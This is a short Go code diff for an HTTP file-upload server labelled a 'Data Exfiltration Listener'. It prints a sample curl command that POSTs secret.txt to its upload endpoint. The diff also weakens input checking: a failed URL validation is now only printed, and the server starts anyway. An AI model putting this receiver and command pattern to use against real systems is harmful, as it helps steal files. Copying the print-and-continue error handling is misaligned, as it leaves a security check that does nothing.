@@ -265,18 +265,13 @@ func main(){
 			log.Fatalf("Invalid port: %s", *uploadFilesPort)
 		}
 
-		// Checks if the directory contains letters
-		match, _ := regexp.MatchString(`[[:alpha:]]`, *uploadFilesUrlPath)
+		// Checks if the url is valid 
+		_, err := validation.ValidateURL(*uploadFilesUrlPath)
 
-		// Checks if there is not a match
-		if !match {
-			log.Fatalf("Invaild format: %s. URL path must include some letters", *uploadFilesUrlPath)
-		}
-
-		// Checks for if the string starts with a forward dash
-		if !strings.HasPrefix(*uploadFilesUrlPath, "/"){
-			log.Fatalf("Invaild format: %s. URL path must include '/'", *uploadFilesUrlPath)
-		}
+		// Checks if there is errors
+		if err != nil{
+			fmt.Println(err)
+		} 
 
 		// Handles the function
 		http.HandleFunc(*uploadFilesUrlPath, uploadHandler)
@@ -284,7 +279,8 @@ func main(){
 		// Prints information about the path
 		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
 		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
-
+		
+		// Listens and serves the server
 		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
 			log.Fatal(err)
 		}
